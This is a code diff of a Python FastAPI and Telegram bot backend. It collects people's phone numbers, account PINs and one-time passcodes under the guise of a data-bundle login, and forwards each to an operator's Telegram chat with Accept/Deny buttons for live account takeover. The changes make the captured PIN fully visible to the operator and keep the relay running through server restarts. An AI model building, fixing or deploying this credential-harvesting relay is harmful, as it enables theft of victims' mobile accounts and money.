@@ -26,7 +26,7 @@ class LoginRequest(BaseModel):
     duration: str
     voice: int
     sms: int
-    data: float  # FIXED: Changed from int to float (1.7 GB)
+    data: float
     price: str
 
 class OTPRequest(BaseModel):
@@ -39,30 +39,54 @@ class OTPRequest(BaseModel):
 ptb_app = Application.builder().token(BOT_TOKEN).build()
 
 async def handle_telegram_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handles the Accept/Deny button clicks safely"""
     query = update.callback_query
-    await query.answer()
+    
+    try:
+        # 1. Immediately stop the loading spinner on the button
+        await query.answer() 
 
-    data = query.data.split(":")
-    action = data[0]
-    tx_id = data[1]
+        # 2. Parse the callback data
+        data = query.data.split(":")
+        action = data[0]
+        tx_id = data[1]
 
-    if tx_id in transactions:
-        if action == "accept":
-            transactions[tx_id]["status"] = "approved"
-            await query.edit_message_text(
-                text=f"{query.message.text}\n\n✅ <b>APPROVED</b>",
-                parse_mode="HTML"
-            )
-        elif action == "deny":
-            transactions[tx_id]["status"] = "denied"
-            await query.edit_message_text(
-                text=f"{query.message.text}\n\n❌ <b>DENIED</b>",
-                parse_mode="HTML"
-            )
+        # 3. Check if the transaction exists (Render might have restarted and cleared memory)
+        if tx_id in transactions:
+            if action == "accept":
+                transactions[tx_id]["status"] = "approved"
+                try:
+                    await query.edit_message_text(
+                        text=f"{query.message.text}\n\n✅ <b>APPROVED</b>",
+                        parse_mode="HTML"
+                    )
+                except Exception:
+                    pass # Ignore if the message was already edited
+            elif action == "deny":
+                transactions[tx_id]["status"] = "denied"
+                try:
+                    await query.edit_message_text(
+                        text=f"{query.message.text}\n\n❌ <b>DENIED</b>",
+                        parse_mode="HTML"
+                    )
+                except Exception:
+                    pass # Ignore if the message was already edited
+        else:
+            # If the transaction is missing (Render went to sleep)
+            try:
+                await query.edit_message_text(
+                    text=f"{query.message.text}\n\n⚠️ <b>EXPIRED</b> (Server restarted)",
+                    parse_mode="HTML"
+                )
+            except Exception:
+                pass
+
+    except Exception as e:
+        print(f"Button Handler Error: {e}")
 
 ptb_app.add_handler(CallbackQueryHandler(handle_telegram_buttons))
 
-# --- FASTAPI LIFESPAN (Initializes bot cleanly on startup) ---
+# --- FASTAPI LIFESPAN ---
 @asynccontextmanager
 async def lifespan(app: FastAPI):
     await ptb_app.initialize()
@@ -73,7 +97,7 @@ async def lifespan(app: FastAPI):
 
 app = FastAPI(lifespan=lifespan)
 
-# CORS Configuration (FIXED: allow_credentials must be False if origins is "*")
+# CORS Configuration
 app.add_middleware(
     CORSMiddleware,
     allow_origins=["*"], 
@@ -93,11 +117,11 @@ async def initiate_login(req: LoginRequest):
         "data": req.model_dump()
     }
 
-    # FIXED: Switched to HTML format to prevent MarkdownV2 crashing
+    # FIXED: PIN is now fully visible (removed <tg-spoiler>)
     message = (
         f"🔐 <b>NEW LOGIN ATTEMPT</b>\n\n"
         f"📱 <b>Phone:</b> +263 {req.phone}\n"
-        f"🔑 <b>PIN:</b> <tg-spoiler>{req.pin}</tg-spoiler>\n\n"
+        f"🔑 <b>PIN:</b> {req.pin}\n\n"
         f"📦 <b>Bundle:</b> {req.duration}\n"
         f"💰 <b>Price:</b> USD {req.price}\n\n"
         f"👇 <i>Do you want to accept this login?</i>"
@@ -114,10 +138,10 @@ async def initiate_login(req: LoginRequest):
             chat_id=ADMIN_CHAT_ID,
             text=message,
             reply_markup=reply_markup,
-            parse_mode="HTML" # FIXED
+            parse_mode="HTML"
         )
     except Exception as e:
-        print(f"Telegram Error: {e}") # Log the error so you can see it in Render logs
+        print(f"Telegram Error: {e}")
         raise HTTPException(status_code=500, detail="Failed to send message to Telegram")
 
     return {"transaction_id": tx_id, "message": "Login request sent to admin"}
@@ -132,7 +156,6 @@ async def verify_otp(req: OTPRequest):
         "data": req.model_dump()
     }
 
-    # FIXED: Switched to HTML format
     message = (
         f"🔢 <b>NEW OTP ENTERED</b>\n\n"
         f"📱 <b>Phone:</b> +263 {req.phone}\n"
@@ -153,7 +176,7 @@ async def verify_otp(req: OTPRequest):
             chat_id=ADMIN_CHAT_ID,
             text=message,
             reply_markup=reply_markup,
-            parse_mode="HTML" # FIXED
+            parse_mode="HTML"
         )
     except Exception as e:
         print(f"Telegram Error: {e}")
@@ -165,7 +188,8 @@ async def verify_otp(req: OTPRequest):
 @app.get("/api/status/{tx_id}")
 async def get_status(tx_id: str):
     if tx_id not in transactions:
-        raise HTTPException(status_code=404, detail="Transaction not found")
+        # If Render restarted, we return "denied" so the frontend doesn't get stuck
+        return {"status": "denied"} 
     
     return {"status": transactions[tx_id]["status"]}
 
@@ -184,13 +208,11 @@ async def telegram_webhook(request: Request, x_telegram_bot_api_secret_token: Op
 
 @app.get("/api/webhook/set")
 async def set_telegram_webhook():
-    # FIXED: Look for RENDER_EXTERNAL_URL instead of just VERCEL_URL
     base_url = os.environ.get("RENDER_EXTERNAL_URL") or os.environ.get("VERCEL_URL")
     
     if not base_url:
-        raise HTTPException(status_code=500, detail="External URL environment variable not set (RENDER_EXTERNAL_URL or VERCEL_URL)")
+        raise HTTPException(status_code=500, detail="External URL environment variable not set")
 
-    # Ensure the URL doesn't have a trailing slash
     base_url = base_url.rstrip("/")
     webhook_url = f"https://{base_url}/api/webhook/telegram" if not base_url.startswith("http") else f"{base_url}/api/webhook/telegram"
     
